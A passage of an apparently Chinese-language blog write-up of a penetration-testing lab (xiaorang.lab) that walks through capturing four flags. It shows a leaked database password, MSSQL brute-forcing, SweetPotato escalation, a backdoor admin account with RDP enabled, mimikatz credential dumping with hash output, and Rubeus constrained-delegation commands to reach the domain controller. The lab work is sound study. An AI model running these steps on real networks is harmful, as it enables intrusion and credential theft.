+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="w"></span><span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;WpuserEha8Fgj9&#39;</span><span class="w"> </span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="w"></span><span class="cm">/** Database hostname */</span><span class="w">
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="w"></span><span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;127.0.0.1&#39;</span><span class="w"> </span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="w"></span><span class="cm">/** Database charset to use in creating database tables. */</span><span class="w">
+</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="w"></span><span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;DB_CHARSET&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;utf8mb4&#39;</span><span class="w"> </span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="w"></span><span class="cm">/** The database collate type. Don&#39;t change this if in doubt. */</span><span class="w">
+</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="w"></span><span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;DB_COLLATE&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><pre tabindex="0"><code>wpuser/WpuserEha8Fgj9
+</code></pre><p>这个机子不对外开放端口，所以我们直接用webshell管理器上的数据库管理工具连</p>
+<p><img alt="image-20250317205907473" loading="lazy" src="../assets/image-20250317205907473.png"></p>
+<p>拿到第二个flag</p>
+<pre tabindex="0"><code>flag{c757e423-eb44-459c-9c63-7625009910d8}
+</code></pre><h3 id="flag3">FLAG3<a hidden class="anchor" aria-hidden="true" href="#flag3">#</a></h3>
+<p>在表S0meth1ng_y0u_m1ght_1ntereSted有一堆密码</p>
+<p>不知道有什么用，先导出来</p>
+<p><strong>注意这里用蚁剑导出之前记得将limit去掉，不然密码不全</strong></p>
+<p><img alt="image-20250317210114116" loading="lazy" src="../assets/image-20250317210114116.png"></p>
+<p><strong>172.22.2.16</strong>上有mssql服务</p>
+<pre tabindex="0"><code>NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393
+</code></pre><p>用我们手上的这堆密码爆破一下</p>
+<p><img alt="image-20250317212152193" loading="lazy" src="../assets/image-20250317212152193.png"></p>
+<p>成功拿到账号密码</p>
+<pre tabindex="0"><code>sa/ElGNkOiC
+</code></pre><p>接下来直接用mdut连</p>
+<p><img alt="image-20250317212417972" loading="lazy" src="../assets/image-20250317212417972.png"></p>
+<p>拿到<strong>nt service\mssqlserver</strong>权限</p>
+<p>没找到flag，猜测需要提权。</p>
+<p>可以用SweetPotato提权</p>
+<pre tabindex="0"><code>C:/Users/Public/sweetpotato.exe -a &#34;whoami&#34;
+</code></pre><p><img alt="image-20250317220327866" loading="lazy" src="../assets/image-20250317220327866.png"></p>
+<p>拿到第三个flag</p>
+<pre tabindex="0"><code>=====================================
+
+8&#34;&#34;&#34;&#34;8                           88     8&#34;&#34;&#34;8                    
+8    8   eeee
+e  e   e eeeee eeee 88     8   8  eeeee eeeee eeeee 
+8eeee8ee 8   8  8   8   8   8    88  88 8eee8e 8  88 8   8 8   8 
+88     8 8eee8e 8e  8   8e  8eee 88ee88 88   8 8   8 8eee8 8e  8 
+88     8 88   8 88  8   88  88       88 88   8 8   8 88  8 88  8 
+88eeeee8 88   8 88ee8   88  88ee     88 88   8 8eee8 88  8 88ee8 
+
+
+flag03: flag{6fc1b639-d71c-4c8b-9747-e29074e05a7e}
+</code></pre><h3 id="flag4">FLAG4<a hidden class="anchor" aria-hidden="true" href="#flag4">#</a></h3>
+<p>新建一个用户用rdp连上去</p>
+<pre tabindex="0"><code>net user xrntkk Abc123456 /add
+net localgroup administrators xrntkk /add
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+</code></pre><p>信息收集一下</p>
+<p><img alt="image-20250317221808816" loading="lazy" src="../assets/image-20250317221808816.png"></p>
+<p>发现这台机子在域内</p>
+<p>用bloodhound做一下信息收集</p>
+<p>chu0的图，偷过来了![undefined (1)](../assets/undefined (1).png)</p>
+<p>从图中我们可以看到，MSSQLSERVER 具有对 DC 的约束性委派权限</p>
+<p>我们可以尝试进行约束性委派攻击</p>
+<h4 id="什么是约束性委派">什么是约束性委派？<a hidden class="anchor" aria-hidden="true" href="#什么是约束性委派">#</a></h4>
+<p>原理大致如下，参考文章：</p>
+<p><a href="https://xz.aliyun.com/news/13854">https://xz.aliyun.com/news/13854</a></p>
+<p><img alt="image-20250317223011253" loading="lazy" src="../assets/image-20250317223011253.png"></p>
+<p><img alt="image-20250317223039443" loading="lazy" src="../assets/image-20250317223039443.png"></p>
+<p>所以我们接下来就要尝试用mimikatz抓取hash，然后申请TGT，最后伪造S4U请求访问DC</p>
+<p>先传一个mimikatz.exe，管理员打开</p>
+<pre tabindex="0"><code>log
+privilege::Debug 
+sekurlsa::logonpasswords 
+exit
+</code></pre><p>抓到一个用户hash</p>
+<pre tabindex="0"><code>Authentication Id : 0 ; 95385 (00000000:00017499)
+Session           : Service from 0
+User Name         : ReportServer
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 2025/3/17 19:28:19
+SID               : S-1-5-80-2885764129-887777008-271615777-1616004480-2722851051
+	msv :	
+	 [00000003] Primary
+	 * Username : MSSQLSERVER$
+	 * Domain   : XIAORANG
+	 * NTLM     : 7e7c2b7d5cbee13683f637e721e4a147
+	 * SHA1     : d112e5ca3e3c502539058a39f153b432642aec96
+	tspkg :	
+	wdigest :	
+	 * Username : MSSQLSERVER$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : MSSQLSERVER$
+	 * Domain   : xiaorang.lab
+	 * Password : 6c 8f 64 88 42 1e e5 dc ea 08 1f 03 05 9b e4 a5 50 70 b8 74 77 7b 50 b1 1e 80 d5 4b 0e 79 7c 9b b6 75 53 56 49 19 66 72 a9 d3 50 f8 d3 ab 0e bd e3 14 96 72 a5 fb b5 3f dc d9 ce 37 91 a2 5f d6 a1 2c 39 ea dc f3 80 e6 d2 cd c0 e6 f2 45 cd d1 80 aa f2 7f 47 09 44 ca 7d aa a0 10 c8 3c 5e e0 ae 71 77 f4 f3 1b 13 88 ab 39 68 37 41 43 e0 45 eb 6c 2d f6 fd 67 c6 ac 67 3e dd 56 71 48 b2 ed 7a f8 8c 4f d6 30 67 a2 32 8f 05 a0 2e 65 05 ce af 7d a6 c2 8e d9 c9 fc 31 6b 8e a1 7f 95 0a 2b 68 88 db 11 d9 9c f5 af 68 8c 0e ac 03 93 79 07 59 dd e6 da 42 2c 72 55 8d 3d 35 a9 85 49 90 3f 7b fb 7d b2 72 f7 76 7e ba c5 f0 98 77 fa 18 b2 b4 7c 65 d2 84 b7 8b e3 b2 fe bf 00 92 24 3b 9c b2 98 d3 5b 82 d4 d1 9f b5 aa c9 3b 54 33 26 34 
+	ssp :	
+	credman :	
+</code></pre><p>先用这个账号申请一个TGT</p>
+<pre tabindex="0"><code>Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:7e7c2b7d5cbee13683f637e721e4a147 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap &gt; TGT.txt
+</code></pre><p>结果</p>
+<pre tabindex="0"><code>
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.2 
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 7e7c2b7d5cbee13683f637e721e4a147
+[*] Building AS-REQ (w/ preauth) for: &#39;xiaorang.lab\MSSQLSERVER$&#39;
+[*] Using domain controller: 172.22.2.3:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE241tFjqrNfSoJoWlwylgM3bm183XnDyobdNuAnnh9mSDWS0SeH3+fwYgRMoAEPiDGuFo4fL+kul5qEbaYGfcl14J+SUaXE/f7JTn70xMBMfWdUS7ulBsLcLpx1xdDBgD6tvlkZAD0xrCljRUh2fYuS/5XslPN09EIOjbPDbUbeI5NOjmyFkc1kkkui9vQvTFcAn4LBWsjsmpajvNPYURpguJufgPgPcrDfsLcxdSGWoLeTdzasNYLXCdejYvH465Z56r3k6PbsBDKccsFzIeaTbaud4eHkDlW6O5xlNuQHIkNlp/THSzinnMkAh3T42u3UfxVS5cOyfgeRmkIlHTUFnrbu+Fd2h+pdawCrcedkPOyXR2nbX3iRcL1qul8TbQRInHDyBtr7LrELv+BDYlwWNHV5gB00MhCNXlTcZ6WPLBMoiMAb9LismX6i6wjgVIFpWOAt+Nn/13sz1PTC3akcG+x9GJ9I7iKH48KGNYS38B0KMyJEr402QAaYegGtv2W1vsTiumKxWCL2zOnLq3RLoFY1j72ugPYW1TgbaPrAOz8IWuWPyijEWCV4BxfzCMAHHxwvP3eJeBDRCueYvC85hJO7K5HseG6DOE0OCheBlZF0P7Zy+4su8XjOMPoK1QNcdnaBf/bGb5vci6Hm/sgEOzNtYuD+PjPNysyzge6TbGjCKW/zBCP3rZrkUL6HHby0/yP2KDXb4WZkTZmufLeEOeWYpuUS1j0zMXHIkv9aU7qhhUzznNo80Qq3bD4GSg0eh4JZTsLundidcOq8vbtv9AEfUxAp1yPCyAmB6NtfvACSZBSf7VYHtDQcta5t0DqVJ6h/gpX6uLCjwX0rITkCoUTbcR/+xavKHkWrLboa7XRKp4ZcinRy3kqCGd00qpgtryCduqhduQsMBlEOB7CeVBHTU/pjB/VpmNEWfSQSEx6SuVvf10a/tk9WKLHMukC+PGdEUp8JS3GvIMAmd3ZtC0SD0UXCZrDUhqdMs2ZjTNT4T+cBsdsdhEEt4cWq7Liktit+DR9DcJ0v6NNAQRHJA1htumPpNRsrn4YyEbjZwYuBxnJbH2rAqF1CwKsPOCtQIQhs90Fj9lz7v2ESjCXDxKm43qjwYiopWKy+4vqKNtzdcymFPme9HVPuFCnj/UwwYibvuXgwQZaNytazMd8N79wOVm3TK6TqblZUL9DaWMgBAAG5ORsUPFIaeM8XkuMwRPMX4cte7MuxK5TwOfNAOjWBBG1sIG1hit3eFXLkNWUuPLI5I2xh4YwFefKIY9p/8j3hQKga2CAU6bJDUYu3HNbHZyT9eQi1xi1KQbKUerFE+I5efaISQmVixkYGlSPIyQpGIFQdT8KeV84giD2Jefxty8Ik2W/8TGh8b2bn4bWJ1g8iMgzuurzbUEZjlf9mSWRdg8qU4PxsXcbf4Bk253/mclXVFCNojLz1RLVoj6TtJAIFw+IJG39dvcCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCCJ8Tx7azYeDfrUgOy2MJkoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMxNzE1MjQ1N1qmERgPMjAyNTAzMTgwMTI0NTdapxEYDzIwMjUwMzI0MTUyNDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==
+
+  ServiceName              :  krbtgt/xiaorang.lab
+  ServiceRealm             :  XIAORANG.LAB
+  UserName                 :  MSSQLSERVER$ (NT_PRINCIPAL)
+  UserRealm                :  XIAORANG.LAB
+  StartTime                :  2025/3/17 23:24:57
+  EndTime                  :  2025/3/18 9:24:57
+  RenewTill                :  2025/3/24 23:24:57
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  gifE8e2s2Hg361IDstjCZA==
+  ASREP (key)              :  7E7C2B7D5CBEE13683F637E721E4A147
+</code></pre><p>得到base64编码的TGT票据，利用Rubeus导入票据</p>
+<pre tabindex="0"><code>Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE241tFjqrNfSoJoWlwylgM3bm183XnDyobdNuAnnh9mSDWS0SeH3+fwYgRMoAEPiDGuFo4fL+kul5qEbaYGfcl14J+SUaXE/f7JTn70xMBMfWdUS7ulBsLcLpx1xdDBgD6tvlkZAD0xrCljRUh2fYuS/5XslPN09EIOjbPDbUbeI5NOjmyFkc1kkkui9vQvTFcAn4LBWsjsmpajvNPYURpguJufgPgPcrDfsLcxdSGWoLeTdzasNYLXCdejYvH465Z56r3k6PbsBDKccsFzIeaTbaud4eHkDlW6O5xlNuQHIkNlp/THSzinnMkAh3T42u3UfxVS5cOyfgeRmkIlHTUFnrbu+Fd2h+pdawCrcedkPOyXR2nbX3iRcL1qul8TbQRInHDyBtr7LrELv+BDYlwWNHV5gB00MhCNXlTcZ6WPLBMoiMAb9LismX6i6wjgVIFpWOAt+Nn/13sz1PTC3akcG+x9GJ9I7iKH48KGNYS38B0KMyJEr402QAaYegGtv2W1vsTiumKxWCL2zOnLq3RLoFY1j72ugPYW1TgbaPrAOz8IWuWPyijEWCV4BxfzCMAHHxwvP3eJeBDRCueYvC85hJO7K5HseG6DOE0OCheBlZF0P7Zy+4su8XjOMPoK1QNcdnaBf/bGb5vci6Hm/sgEOzNtYuD+PjPNysyzge6TbGjCKW/zBCP3rZrkUL6HHby0/yP2KDXb4WZkTZmufLeEOeWYpuUS1j0zMXHIkv9aU7qhhUzznNo80Qq3bD4GSg0eh4JZTsLundidcOq8vbtv9AEfUxAp1yPCyAmB6NtfvACSZBSf7VYHtDQcta5t0DqVJ6h/gpX6uLCjwX0rITkCoUTbcR/+xavKHkWrLboa7XRKp4ZcinRy3kqCGd00qpgtryCduqhduQsMBlEOB7CeVBHTU/pjB/VpmNEWfSQSEx6SuVvf10a/tk9WKLHMukC+PGdEUp8JS3GvIMAmd3ZtC0SD0UXCZrDUhqdMs2ZjTNT4T+cBsdsdhEEt4cWq7Liktit+DR9DcJ0v6NNAQRHJA1htumPpNRsrn4YyEbjZwYuBxnJbH2rAqF1CwKsPOCtQIQhs90Fj9lz7v2ESjCXDxKm43qjwYiopWKy+4vqKNtzdcymFPme9HVPuFCnj/UwwYibvuXgwQZaNytazMd8N79wOVm3TK6TqblZUL9DaWMgBAAG5ORsUPFIaeM8XkuMwRPMX4cte7MuxK5TwOfNAOjWBBG1sIG1hit3eFXLkNWUuPLI5I2xh4YwFefKIY9p/8j3hQKga2CAU6bJDUYu3HNbHZyT9eQi1xi1KQbKUerFE+I5efaISQmVixkYGlSPIyQpGIFQdT8KeV84giD2Jefxty8Ik2W/8TGh8b2bn4bWJ1g8iMgzuurzbUEZjlf9mSWRdg8qU4PxsXcbf4Bk253/mclXVFCNojLz1RLVoj6TtJAIFw+IJG39dvcCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCCJ8Tx7azYeDfrUgOy2MJkoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMxNzE1MjQ1N1qmERgPMjAyNTAzMTgwMTI0NTdapxEYDzIwMjUwMzI0MTUyNDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==
+</code></pre><p><img alt="image-20250317232613642" loading="lazy" src="../assets/image-20250317232613642.png"></p>
+<p>接下来就可以和DC进行通讯了</p>
+<pre tabindex="0"><code>WIN+R
+\\DC.xiaorang.lab\C$\Users\Administrator\flag\
+</code></pre><p><img alt="image-20250317233125339" loading="lazy" src="../assets/image-20250317233125339.png"></p>
+<p>或者</p>
+<pre tabindex="0"><code>type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
+</code></pre><pre tabindex="0"><code> ######:                                               ###   ######:                             ##
+ #######                         ##                   :###   #######                             ##
+ ##   :##                        ##                  .####   ##   :##                            ##
+ ##    ##   ##.####  ##    ##  #######    .####:     ##.##   ##    ##   .####.    :####     :###.##
+ ##   :##   #######  ##    ##  #######   .######:   :#: ##   ##   :##  .######.   ######   :#######
+ #######.   ###.     ##    ##    ##      ##:  :##  .##  ##   #######:  ###  ###   #:  :##  ###  ###
+ #######.   ##       ##    ##    ##      ########  ##   ##   ######    ##.  .##    :#####  ##.  .##
+ ##   :##   ##       ##    ##    ##      ########  ########  ##   ##.  ##    ##  .#######  ##    ##
+ ##    ##   ##       ##    ##    ##      ##        ########  ##   ##   ##.  .##  ## .  ##  ##.  .##
+ ##   :##   ##       ##:  ###    ##.     ###.  :#       ##   ##   :##  ###  ###  ##:  ###  ###  ###
+ ########   ##        #######    #####   .#######       ##   ##    ##: .######.  ########  :#######
+ ######     ##         ###.##    .####    .#####:       ##   ##    ###  .####.     ###.##   :###.##
+
+
+Well done hacking!
+This is the final flag, you deserve it!
+
+
+flag04: flag{1c3cf693-f2fc-4f35-aece-789e66f56ecc}
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
+      <li><a href="http://localhost:1313/tags/%E6%B8%97%E9%80%8F/">渗透</a></li>
+      <li><a href="http://localhost:1313/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="http://localhost:1313/post/tpctf_2025/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>TPCTF2025-Web-赛后复现Writeup</span>
+  </a>
+</nav>
+
+  </footer><div id="tw-comment"></div>
+<script>
+    
+    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
+    const setGiscusTheme = () => {
+        const sendMessage = (message) => {
+            const iframe = document.querySelector('iframe.giscus-frame');
+            if (iframe) {
+                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
+            }
+        }
+        sendMessage({setConfig: {theme: getStoredTheme()}})
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+        const giscusAttributes = {
+            "src": "https://giscus.app/client.js",
+            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
+            "data-repo-id": "xxxxxx",
+            "data-category": "Announcements",
+            "data-category-id": "xxxxx",
+            "data-mapping": "pathname",
+            "data-strict": "0",
+            "data-reactions-enabled": "1",
+            "data-emit-metadata": "0",
+            "data-input-position": "bottom",
+            "data-theme": getStoredTheme(),
+            "data-lang": "zh-CN",
+            "data-loading": "lazy",
+            "crossorigin": "anonymous",
+        };
+
+        
+        const giscusScript = document.createElement("script");
+        Object.entries(giscusAttributes).forEach(
+                ([key, value]) => giscusScript.setAttribute(key, value));
+        document.querySelector("#tw-comment").appendChild(giscusScript);
+
+        
+        const themeSwitcher = document.querySelector("#theme-toggle");
+        if (themeSwitcher) {
+            themeSwitcher.addEventListener("click", setGiscusTheme);
+        }
+        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
+        if (themeFloatSwitcher) {
+            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
+        }
+    });
+</script>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
